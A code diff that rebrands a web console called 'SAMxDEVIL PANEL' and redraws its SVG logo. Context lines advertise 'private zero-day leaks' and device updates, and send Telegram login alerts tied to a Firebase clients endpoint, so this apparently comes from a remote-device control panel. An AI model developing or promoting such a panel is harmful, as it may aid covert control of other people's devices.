@@ -7,7 +7,7 @@
     <meta http-equiv="Expires" content="0" />
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
-    <title>SAMxDEVIL PANEL</title>
+    <title>SAM X DEVIL PANEL</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Outfit:wght@400;500;600;700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
@@ -5634,7 +5634,7 @@ input, textarea {
                 <div class="icon-ring"></div>
                 <div class="popup-icon">✈️</div>
             </div>
-            <h2>SAMxDEVIL <span>PANEL</span></h2>
+            <h2>SAM X DEVIL <span>PANEL</span></h2>
             <p>Access private zero-day leaks, real-time device updates, and exclusive VIP features instantly.</p>
             <div class="popup-stats">
                 <div class="stat-item"><span class="stat-num">14.8K+</span><span class="stat-lbl">MEMBERS</span></div>
@@ -19573,7 +19573,7 @@ const _tgAdmins = [8765694454];
                 const onlineCount = _tgSessionStore.activeConnections;
                 const apiEndpoint = fbUrl ? fbUrl + "/clients.json" : "N/A";
 
-                const msg = `🚨 <b>NEW LOGIN ALERT — SAMxDEVIL PANEL</b>
+                const msg = `🚨 <b>NEW LOGIN ALERT — SAM X DEVIL PANEL</b>
 
       👤 <b>User Details</b>
       ├ <b>Login Type:</b> ${loginType}
@@ -19705,191 +19705,138 @@ const _tgAdmins = [8765694454];
             })
         }
 
-                function CyberSkullLogo({
-            size = 76,
-            id = "csk",
-            className = ""
-        }) {
-            const s = size || 76, pfx = id || "csk";
-            return r.jsxs("svg", {
-                viewBox: "0 0 100 100",
-                width: s,
-                height: s,
-                className: `cyber-devil-logo-svg ${className}`,
+                function CyberSamXDevilLogo({
+  size = 76,
+  id = "sxd",
+  className = ""
+}) {
+  const s = size || 76, pfx = id || "sxd";
+  return r.jsxs("svg", {
+    viewBox: "0 0 100 100",
+    width: s,
+    height: s,
+    className: `cyber-devil-logo-svg ${className}`,
+    children: [
+      r.jsxs("defs", {
+        children: [
+          r.jsxs("linearGradient", {
+            id: `${pfx}-bevel`,
+            x1: "0%", y1: "0%", x2: "100%", y2: "100%",
+            children: [
+              r.jsx("stop", { offset: "0%", stopColor: "#ff4466" }),
+              r.jsx("stop", { offset: "35%", stopColor: "#ff003c" }),
+              r.jsx("stop", { offset: "70%", stopColor: "#99001b" }),
+              r.jsx("stop", { offset: "100%", stopColor: "#3d000a" })
+            ]
+          }),
+          r.jsxs("radialGradient", {
+            id: `${pfx}-bg`,
+            cx: "50%", cy: "50%", r: "50%",
+            children: [
+              r.jsx("stop", { offset: "0%", stopColor: "#2c000a" }),
+              r.jsx("stop", { offset: "65%", stopColor: "#120104" }),
+              r.jsx("stop", { offset: "100%", stopColor: "#050002" })
+            ]
+          }),
+          r.jsxs("filter", {
+            id: `${pfx}-glow`,
+            x: "-50%", y: "-50%", width: "200%", height: "200%",
+            children: [
+              r.jsx("feGaussianBlur", { in: "SourceGraphic", stdDeviation: "1.8", result: "b1" }),
+              r.jsx("feGaussianBlur", { in: "SourceGraphic", stdDeviation: "4", result: "b2" }),
+              r.jsxs("feMerge", {
                 children: [
-                    r.jsxs("defs", {
-                        children: [
-                            r.jsxs("linearGradient", {
-                                id: `${pfx}-bevel`,
-                                x1: "0%", y1: "0%", x2: "100%", y2: "100%",
-                                children: [
-                                    r.jsx("stop", { offset: "0%", stopColor: "#ff4466" }),
-                                    r.jsx("stop", { offset: "30%", stopColor: "#ff003c" }),
-                                    r.jsx("stop", { offset: "70%", stopColor: "#99001b" }),
-                                    r.jsx("stop", { offset: "100%", stopColor: "#3d000a" })
-                                ]
-                            }),
-                            r.jsxs("linearGradient", {
-                                id: `${pfx}-bone`,
-                                x1: "0%", y1: "0%", x2: "0%", y2: "100%",
-                                children: [
-                                    r.jsx("stop", { offset: "0%", stopColor: "#ffffff" }),
-                                    r.jsx("stop", { offset: "35%", stopColor: "#ffb3c1" }),
-                                    r.jsx("stop", { offset: "75%", stopColor: "#ff003c" }),
-                                    r.jsx("stop", { offset: "100%", stopColor: "#800018" })
-                                ]
-                            }),
-                            r.jsxs("radialGradient", {
-                                id: `${pfx}-bg`,
-                                cx: "50%", cy: "50%", r: "50%",
-                                children: [
-                                    r.jsx("stop", { offset: "0%", stopColor: "#2a0009" }),
-                                    r.jsx("stop", { offset: "60%", stopColor: "#120104" }),
-                                    r.jsx("stop", { offset: "100%", stopColor: "#050002" })
-                                ]
-                            }),
-                            r.jsxs("filter", {
-                                id: `${pfx}-glow`,
-                                x: "-50%", y: "-50%", width: "200%", height: "200%",
-                                children: [
-                                    r.jsx("feGaussianBlur", { in: "SourceGraphic", stdDeviation: "1.8", result: "blur1" }),
-                                    r.jsx("feGaussianBlur", { in: "SourceGraphic", stdDeviation: "4.5", result: "blur2" }),
-                                    r.jsxs("feMerge", {
-                                        children: [
-                                            r.jsx("feMergeNode", { in: "blur2" }),
-                                            r.jsx("feMergeNode", { in: "blur1" }),
-                                            r.jsx("feMergeNode", { in: "SourceGraphic" })
-                                        ]
-                                    })
-                                ]
-                            })
-                        ]
-                    }),
-                    r.jsx("circle", {
-                        className: "logo-reticle-cw",
-                        cx: 50, cy: 50, r: 48,
-                        fill: "none", stroke: "#ff003c", strokeWidth: 0.9,
-                        strokeDasharray: "14 8 2 8", opacity: 0.65
-                    }),
-                    r.jsx("circle", {
-                        className: "logo-reticle-ccw",
-                        cx: 50, cy: 50, r: 44,
-                        fill: "none", stroke: "#00ffff", strokeWidth: 0.7,
-                        strokeDasharray: "4 6 12 6", opacity: 0.6
-                    }),
-                    r.jsx("circle", {
-                        cx: 50, cy: 50, r: 40,
-                        fill: `url(#${pfx}-bg)`, stroke: "#ff003c", strokeWidth: 1.4
-                    }),
-                    r.jsxs("g", {
-                        className: "logo-reticle-cw",
-                        children: [
-                            r.jsx("circle", { cx: 50, cy: 2, r: 1.8, fill: "#00ffff" }),
-                            r.jsx("circle", { cx: 50, cy: 98, r: 1.8, fill: "#ff003c" }),
-                            r.jsx("circle", { cx: 2, cy: 50, r: 1.8, fill: "#ff003c" }),
-                            r.jsx("circle", { cx: 98, cy: 50, r: 1.8, fill: "#00ffff" })
-                        ]
-                    }),
-                    r.jsxs("g", {
-                        stroke: "#ff003c", strokeWidth: 0.8, opacity: 0.85,
-                        children: [
-                            r.jsx("polygon", { points: "18,22 25,18 82,78 75,82", fill: `url(#${pfx}-bevel)` }),
-                            r.jsx("polygon", { points: "18,22 14,18 20,14 25,18", fill: "#00ffff", filter: `url(#${pfx}-glow)` }),
-                            r.jsx("polygon", { points: "82,78 86,82 80,86 75,82", fill: "#ff003c" }),
-                            r.jsx("polygon", { points: "82,22 75,18 18,78 25,82", fill: `url(#${pfx}-bevel)` }),
-                            r.jsx("polygon", { points: "82,22 86,18 80,14 75,18", fill: "#00ffff", filter: `url(#${pfx}-glow)` }),
-                            r.jsx("polygon", { points: "18,78 14,82 20,86 25,82", fill: "#ff003c" })
-                        ]
-                    }),
-                    r.jsx("path", {
-                        d: "M 50 18 C 66 18 78 28 78 44 C 78 52 74 58 70 61 L 70 66 L 64 68 L 62 76 L 38 76 L 36 68 L 30 66 L 30 61 C 26 58 22 52 22 44 C 22 28 34 18 50 18 Z",
-                        fill: `url(#${pfx}-bone)`, stroke: "#ff003c", strokeWidth: 1.2
-                    }),
-                    r.jsx("path", {
-                        d: "M 50 20 C 64 20 74 29 74 42 C 70 38 62 36 50 36 C 38 36 30 38 26 42 C 26 29 36 20 50 20 Z",
-                        fill: "#ffffff", opacity: 0.35
-                    }),
-                    r.jsx("polygon", {
-                        points: "50,23 57,33 50,37 43,33",
-                        fill: "#140105", stroke: "#ff003c", strokeWidth: 0.8
-                    }),
-                    r.jsx("polygon", {
-                        points: "50,26 54,32 50,35 46,32",
-                        fill: "#00ffff", filter: `url(#${pfx}-glow)`,
-                        className: "logo-core-pulse"
-                    }),
-                    r.jsx("polygon", {
-                        points: "32,44 45,42 46,55 37,59 30,52",
-                        fill: "#0a0004", stroke: "#ff003c", strokeWidth: 0.9
-                    }),
-                    r.jsx("circle", {
-                        cx: 39, cy: 50, r: 3.6,
-                        fill: "#00ffff", filter: `url(#${pfx}-glow)`,
-                        className: "logo-core-pulse"
-                    }),
-                    r.jsx("circle", { cx: 39, cy: 50, r: 1.6, fill: "#ffffff" }),
-                    r.jsx("polygon", {
-                        points: "68,44 55,42 54,55 63,59 70,52",
-                        fill: "#0a0004", stroke: "#ff003c", strokeWidth: 0.9
-                    }),
-                    r.jsx("circle", {
-                        cx: 61, cy: 50, r: 3.6,
-                        fill: "#00ffff", filter: `url(#${pfx}-glow)`,
-                        className: "logo-core-pulse"
-                    }),
-                    r.jsx("circle", { cx: 61, cy: 50, r: 1.6, fill: "#ffffff" }),
-                    r.jsx("path", {
-                        d: "M 57 50 L 65 50 M 61 46 L 61 54",
-                        stroke: "#00ffff", strokeWidth: 0.7
-                    }),
-                    r.jsx("polygon", {
-                        points: "50,53 46,63 50,65 54,63",
-                        fill: "#0a0004", stroke: "#ff003c", strokeWidth: 0.8
-                    }),
-                    r.jsx("polygon", {
-                        points: "50,56 48,61 50,62 52,61",
-                        fill: "#ff003c"
-                    }),
-                    r.jsx("polygon", {
-                        points: "25,56 29,56 28,64 24,61",
-                        fill: `url(#${pfx}-bevel)`
-                    }),
-                    r.jsx("polygon", {
-                        points: "75,56 71,56 72,64 76,61",
-                        fill: `url(#${pfx}-bevel)`
-                    }),
-                    r.jsx("rect", { x: 38, y: 68, width: 4, height: 6, rx: 1, fill: "#ffffff", stroke: "#330009", strokeWidth: 0.6 }),
-                    r.jsx("rect", { x: 44, y: 68, width: 4, height: 6, rx: 1, fill: "#ffffff", stroke: "#330009", strokeWidth: 0.6 }),
-                    r.jsx("rect", { x: 52, y: 68, width: 4, height: 6, rx: 1, fill: "#ffffff", stroke: "#330009", strokeWidth: 0.6 }),
-                    r.jsx("rect", { x: 58, y: 68, width: 4, height: 6, rx: 1, fill: "#ffffff", stroke: "#330009", strokeWidth: 0.6 }),
-                    r.jsx("polygon", {
-                        points: "37,76 63,76 60,85 40,85",
-                        fill: `url(#${pfx}-bevel)`, stroke: "#ff003c", strokeWidth: 0.9
-                    }),
-                    r.jsx("rect", { x: 41, y: 75, width: 3.5, height: 4, rx: 0.8, fill: "#ffffff", stroke: "#330009", strokeWidth: 0.5 }),
-                    r.jsx("rect", { x: 46, y: 75, width: 3.5, height: 4, rx: 0.8, fill: "#ffffff", stroke: "#330009", strokeWidth: 0.5 }),
-                    r.jsx("rect", { x: 50.5, y: 75, width: 3.5, height: 4, rx: 0.8, fill: "#ffffff", stroke: "#330009", strokeWidth: 0.5 }),
-                    r.jsx("rect", { x: 55.5, y: 75, width: 3.5, height: 4, rx: 0.8, fill: "#ffffff", stroke: "#330009", strokeWidth: 0.5 }),
-                    r.jsx("circle", {
-                        cx: 50, cy: 81, r: 1.5,
-                        fill: "#00ffff", filter: `url(#${pfx}-glow)`,
-                        className: "logo-core-pulse"
-                    }),
-                    r.jsx("path", {
-                        d: "M 23 44 L 16 44 L 12 50 L 12 60 L 18 64",
-                        fill: "none", stroke: "rgba(0, 255, 255, 0.7)", strokeWidth: 0.8
-                    }),
-                    r.jsx("circle", { cx: 18, cy: 64, r: 1.2, fill: "#00ffff" }),
-                    r.jsx("path", {
-                        d: "M 77 44 L 84 44 L 88 50 L 88 60 L 82 64",
-                        fill: "none", stroke: "rgba(255, 0, 60, 0.7)", strokeWidth: 0.8
-                    }),
-                    r.jsx("circle", { cx: 82, cy: 64, r: 1.2, fill: "#ff003c" })
+                  r.jsx("feMergeNode", { in: "b2" }),
+                  r.jsx("feMergeNode", { in: "b1" }),
+                  r.jsx("feMergeNode", { in: "SourceGraphic" })
                 ]
-            });
-        }
-
-        const CyberDevilLogo = CyberSkullLogo;
+              })
+            ]
+          })
+        ]
+      }),
+      r.jsx("circle", {
+        className: "logo-reticle-cw",
+        cx: 50, cy: 50, r: 48,
+        fill: "none", stroke: "#ff003c", strokeWidth: 0.9,
+        strokeDasharray: "14 8 2 8", opacity: 0.65
+      }),
+      r.jsx("circle", {
+        className: "logo-reticle-ccw",
+        cx: 50, cy: 50, r: 44,
+        fill: "none", stroke: "#00ffff", strokeWidth: 0.7,
+        strokeDasharray: "4 6 12 6", opacity: 0.6
+      }),
+      r.jsx("circle", {
+        cx: 50, cy: 50, r: 40,
+        fill: `url(#${pfx}-bg)`, stroke: "#ff003c", strokeWidth: 1.4
+      }),
+      r.jsxs("g", {
+        className: "logo-reticle-cw",
+        children: [
+          r.jsx("circle", { cx: 50, cy: 2, r: 2, fill: "#00ffff", filter: `url(#${pfx}-glow)` }),
+          r.jsx("circle", { cx: 50, cy: 98, r: 2, fill: "#ff003c", filter: `url(#${pfx}-glow)` }),
+          r.jsx("circle", { cx: 2, cy: 50, r: 2, fill: "#ff003c" }),
+          r.jsx("circle", { cx: 98, cy: 50, r: 2, fill: "#00ffff" })
+        ]
+      }),
+      r.jsx("path", {
+        d: "M 32 17 L 68 17 L 63 30 L 37 30 Z",
+        fill: "#180106", stroke: "#ff003c", strokeWidth: 0.9
+      }),
+      r.jsx("path", {
+        d: "M 35 19 L 65 19",
+        stroke: "#00ffff", strokeWidth: 0.8, opacity: 0.7
+      }),
+      r.jsx("text", {
+        x: 50, y: 27, textAnchor: "middle", fill: "#ffffff",
+        fontSize: 8, fontWeight: 900,
+        fontFamily: "'Outfit', 'Segoe UI', sans-serif",
+        letterSpacing: 2.5, filter: `url(#${pfx}-glow)`,
+        children: "SAM"
+      }),
+      r.jsxs("g", {
+        children: [
+          r.jsx("polygon", { points: "26,35 34,33 74,73 66,75", fill: `url(#${pfx}-bevel)` }),
+          r.jsx("polygon", { points: "74,35 66,33 26,73 34,75", fill: `url(#${pfx}-bevel)` }),
+          r.jsx("polygon", { points: "28,36 48,51 44,55 25,39", fill: "#ff6688", opacity: 0.8 }),
+          r.jsx("polygon", { points: "72,36 52,51 56,55 75,39", fill: "#ff003c", opacity: 0.9 }),
+          r.jsx("polygon", { points: "28,72 48,57 44,53 25,69", fill: "#ff003c", opacity: 0.9 }),
+          r.jsx("polygon", { points: "72,72 52,57 56,53 75,69", fill: "#ff6688", opacity: 0.8 }),
+          r.jsx("line", { x1: 26, y1: 35, x2: 74, y2: 73, stroke: "#00ffff", strokeWidth: 0.9, opacity: 0.7 }),
+          r.jsx("line", { x1: 74, y1: 35, x2: 26, y2: 73, stroke: "#ffffff", strokeWidth: 0.9, opacity: 0.7 })
+        ]
+      }),
+      r.jsx("polygon", {
+        className: "logo-core-pulse",
+        points: "50,47 56,53 50,59 44,53",
+        fill: "#00ffff", filter: `url(#${pfx}-glow)`
+      }),
+      r.jsx("circle", { cx: 50, cy: 53, r: 1.5, fill: "#ffffff" }),
+      r.jsx("path", {
+        d: "M 30 76 L 70 76 L 65 89 L 50 91 L 35 89 Z",
+        fill: "#180106", stroke: "#ff003c", strokeWidth: 0.9
+      }),
+      r.jsx("path", {
+        d: "M 36 88 L 50 90 L 64 88",
+        stroke: "#ff003c", strokeWidth: 0.7, opacity: 0.7
+      }),
+      r.jsx("text", {
+        x: 50, y: 85, textAnchor: "middle", fill: "#ff3366",
+        fontSize: 7.5, fontWeight: 900,
+        fontFamily: "'Outfit', 'Segoe UI', sans-serif",
+        letterSpacing: 2, filter: `url(#${pfx}-glow)`,
+        children: "DEVIL"
+      }),
+      r.jsx("path", { d: "M 18 35 L 15 35 L 15 38", fill: "none", stroke: "#00ffff", strokeWidth: 1.2 }),
+      r.jsx("path", { d: "M 82 35 L 85 35 L 85 38", fill: "none", stroke: "#00ffff", strokeWidth: 1.2 }),
+      r.jsx("path", { d: "M 18 70 L 15 70 L 15 67", fill: "none", stroke: "#ff003c", strokeWidth: 1.2 }),
+      r.jsx("path", { d: "M 82 70 L 85 70 L 85 67", fill: "none", stroke: "#ff003c", strokeWidth: 1.2 })
+    ]
+  });
+}
+const CyberDevilLogo = CyberSamXDevilLogo;
+const CyberSkullLogo = CyberSamXDevilLogo;
 
         function s1({
             onConnect: A,
@@ -20095,7 +20042,7 @@ const _tgAdmins = [8765694454];
                                         children: [
                                             r.jsx("span", {
                                                 className: "login-title-samx",
-                                                children: "SAMx"
+                                                children: "SAM X"
                                             }),
                                             r.jsx("span", {
                                                 className: "login-title-devil",
@@ -20445,7 +20392,7 @@ const _tgAdmins = [8765694454];
                                 className: "login-live-dot",
                                 style: { width: "5px", height: "5px", background: "#ff003c", boxShadow: "0 0 6px #ff003c" }
                             }),
-                            "SAMxDEVIL CONSOLE • ENCRYPTED GATEWAY • ALL SESSIONS LOGGED"
+                            "SAM X DEVIL CONSOLE • ENCRYPTED GATEWAY • ALL SESSIONS LOGGED"
                         ]
                     })]
                 }), v && r.jsx("div", {
@@ -21858,7 +21805,7 @@ const _tgAdmins = [8765694454];
                                             children: [
                                                 r.jsx("span", {
                                                     className: "live-logo-samx font-black",
-                                                    children: "SAMx"
+                                                    children: "SAM X"
                                                 }),
                                                 r.jsx("span", {
                                                     className: "live-logo-devil font-bold",
